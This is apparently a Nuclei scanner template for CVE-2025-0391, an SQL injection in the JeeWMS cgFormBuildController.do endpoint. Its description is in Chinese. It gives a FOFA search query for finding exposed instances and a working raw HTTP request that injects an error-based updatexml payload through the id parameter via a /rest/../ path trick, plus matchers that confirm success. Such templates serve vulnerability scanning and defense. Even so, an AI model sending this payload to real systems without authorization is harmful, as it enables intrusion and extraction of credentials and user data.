id: JeeWMS-cgFormBuildController_do-sql-CVE-2025-0391

info:
  name: "JeeWMS cgFormBuildController.do 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
      JeeWMS系统cgFormBuildController.do接口存在SQL注入漏洞。攻击者可利用该缺陷执行恶意SQL语句，实现数据库敏感信息提取（如管理员凭证、用户数据），在具备高权限条件下可能部署恶意代码，导致服务器权限丧失。该漏洞的CVE编号为CVE-2025-0391，建议及时应用官方安全补丁。
  reference:
  - https://mp.weixin.qq.com/s/nW8qPYlMZcZE9R-28kMskw
  tags: JeeWMS

http:
- raw:
  - |
    GET /rest/../cgFormBuildController.do?saveOrUpdate&bpm_status=&create_by=&create_date=&create_name=&id='and/**/updatexml(1,concat(0x7e,md5(123123),0x7e),1)and'&sys_company_code=&sys_org_code=&tableName=wm_wendu&update_by=&update_date=&update_name=&wendu_bz=1&wendu_cjsj=2024-05-09+11%3A12%3A41&wendu_dd=1&wendu_zhi=1 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'XPATH syntax error:'
    - '~4297f44b13955235245b2497399d7a9'
    condition: and
  - type: status
    status:
    - 200
